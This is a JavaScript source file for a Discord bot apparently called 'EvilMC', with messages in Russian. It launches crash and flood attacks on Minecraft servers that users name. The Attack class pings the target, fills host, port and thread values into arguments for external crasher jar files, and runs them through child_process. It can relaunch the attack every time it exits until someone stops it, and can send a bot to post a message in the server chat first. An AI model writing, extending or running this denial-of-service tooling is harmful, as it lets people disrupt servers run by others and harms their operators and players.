const Discord = require('discord.js');
const Client = require('./client.js');
const child = require('child_process');
const killPrc = require('tree-kill');
const crashers = require('../functions/crashers.js');
const config = require('../jsons/config.json');
const mp = require('minecraft-protocol');
const mineflayer = require('mineflayer');

class Attack {
    /**
     * @typedef {{client: Client, interaction: Discord.CommandInteraction, jaroptions: {jarname: string, jarargs: string}, AttacksArray: Discord.Collection<string, Attack>, ownerID: string, msgID: string, embed: Discord.EmbedBuilder, threads: Number, host: string, port: Number, method: {text: string, name: string}, unstopable: boolean, crashPrc: child.ChildProcess, pid: Number}} AttackOptions
     * @param {AttackOptions} options 
     */
    constructor(options) {
        this.client = options.client,
            this.interaction = options.interaction,
            this.jaroptions = options.jaroptions,
            this.AttacksArray = options.AttacksArray,
            this.ownerID = options.ownerID,
            this.msgID = options.msgID,
            this.embed = options.embed,
            this.threads = options.threads,
            this.host = options.host,
            this.port = options.port,
            this.method = options.method,
            this.unstopable = options.unstopable,
            this.crashPrc = options.crashPrc,
            this.pid = options.pid

        
        if (config.autoResolver && this.port === 0) {
            crashers.autoResolver(this.host).then(({host, port}) => {
                this.host = host;
                this.port = port;
                console.log(this.port);
                console.log(port);
                this.prepareAttack();
            }).catch(() => {
                this.port = 25565;
            })
        } else this.prepareAttack();
    }

    async runJar() {
        try {
            let crash = child.exec(`java -jar jars/${this.jaroptions.jarname} ${this.jaroptions.jarargs}`, { detached: true }, (error, stdout, stderr) => {
                if (stderr) {
                    console.log(`StdErr: ${stderr}`);
                    return;
                }
                console.log(`[Attack log] ${stdout}`);
            })

            this.crashPrc = crash;
            this.pid = crash.pid;

            if (this.unstopable) {
                crash.on("exit", (code, signal) => {
                    this.runJar();
                })
            }
        } catch (err) {
            await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err);
            console.log(err);
        }
    }

    /**
     * Отправление сообщения на сервер
     * @param {String} msg - Сообщение которое мы хотим отправить
     */
    async sendMsgToServer(msg) {
        const bot = mineflayer.createBot({
            username: config.msgToServer.botName,
            host: this.host,
            port: this.port
        })

        bot.on('login', () => {
            bot.chat(`/register ${config.msgToServer.botPass} ${config.msgToServer.botPass}`);
            bot.chat(`/login ${config.msgToServer.botPass}`);
            setTimeout(() => {
                bot.chat(msg);
                setTimeout(() => bot.quit(), 1500);
            }, 2500);
        })

        bot.on('end', async (reason) => {
            console.log('[LOG] Bot leave from minecraft server');
        })
    }

    async prepareAttack() {
        if (this.threads > config.maxThreads[this.method.name] || this.threads + this.client.activeThreads[this.method.name] > config.maxThreads[this.method.name]) return await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, `**Превышено количество потоков**\n\nВозможные причины:\n\`\`\`1.Вы указали больше потоков чем может запустить бот в данный момент (Активные потоки/Максимальное кол-во потоков: ${this.client.activeThreads[this.method.name]}/${config.maxThreads[this.method.name]})\`\`\`\n\nУкажите другое количество потоков и повторите попытку`, true);
        mp.ping({ host: this.host, port: this.port ? this.port : undefined }, async (err, result) => {
            if (result) {
                this.client.activeThreads[this.method.name] = this.client.activeThreads[this.method.name] + this.threads;
                this.jaroptions.jarargs = this.jaroptions.jarargs.replace(/%HOST%/g, this.host).replace(/%PORT%/g, this.port ? this.port : 25565).replace(/%THREADS%/g, this.threads);

                this.embed = new Discord.EmbedBuilder()
                    .setColor('Random')
                    .setFooter({
                        text: `${this.interaction.guild.name} | EvilMC`,
                        iconURL: this.client.user.avatarURL({ dynamic: true })
                    });

                let runembed;

                if (config.msgToServer.enable) {
                    runembed = this.embed.setDescription(`**► Метод: ${this.method.text}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port ? this.port : 25565} \n \n  ► Атака запускается... \n ☆ Made with ♥ by DesConnet ☆`);

                    await this.interaction.editReply({ embeds: [runembed] })
                    this.sendMsgToServer(config.msgToServer.msg).then(() => {
                        setTimeout(() => this.runAttack(), 1500);
                    })
                } else {
                    this.runAttack();
                }
            } else {
                console.log(err);
                this.AttacksArray.delete(this.msgID, this);
                return await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, "**Время ожидания отклика сервера вышло.**\n\nВозможные причины:\n```1.Сервер выключен\n2.IP и/или Порт введены некоректно.\n3.Боту не удалось пропинговать майнкрафт сервер из-за пустого порта```\n\nПроверьте правильность введенного IP, Порта и повторите попытку.", true);
            }
        })
    };

    async runAttack() {
        let runembed;
        const port = this.port || 25565;
        console.log(`[LOG] Была запущена атака: ${this.method.text}\n[LOG] Название jar: ${this.jaroptions.jarname}\n[LOG] Аргументы jar: ${this.jaroptions.jarargs}\n[LOG] Запустил атаку: ${this.ownerID}`);
        await this.runJar();

        try {
            if (this.unstopable == false) {
                runembed = this.embed.setDescription(`**► Метод: ${this.method.text}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► На 60 секунд!!\n ☆ Made with ♥ by DesConnet ☆`);

                await this.interaction.editReply({ embeds: [runembed] })

                setTimeout(async () => await this.stopAttack(), 60000)
            } else {
                runembed = this.embed.setDescription(`**► Метод: ${this.method.text}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► До тех пор пока вы не нажмете остановить!!\n ☆ Made with ♥ by DesConnet ☆`);

                const stopBtn = new Discord.ButtonBuilder()
                    .setCustomId("stopAttack")
                    .setLabel("Остановить")
                    .setStyle(Discord.ButtonStyle.Danger);

                await this.interaction.editReply({ embeds: [runembed], components: [new Discord.ActionRowBuilder({ components: [stopBtn] })], fetchReply: true })
            }
        } catch (err) {
            console.log(err);
            await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err, true);
        }
    }

    async stopAttack() {
        console.log(`[LOG] Атака ${this.method.text} запущенная ${this.ownerID} была остановлена`);
        try {
            killPrc(this.pid);
            const endembed = this.embed.setDescription(`**► Метод: ${this.method.text}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port} \n \n ► Атака Завершена!\n ☆ Made with ♥ by DesConnet ☆`);
            await this.interaction.editReply({ embeds: [endembed], components: [] });
            this.crashPrc.removeAllListeners();
            this.client.activeThreads[this.method.name] = this.client.activeThreads[this.method.name] - this.threads;
            this.AttacksArray.delete(this.msgID, this);
        } catch (err) {
            await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err);
        }
    };
}

module.exports = Attack;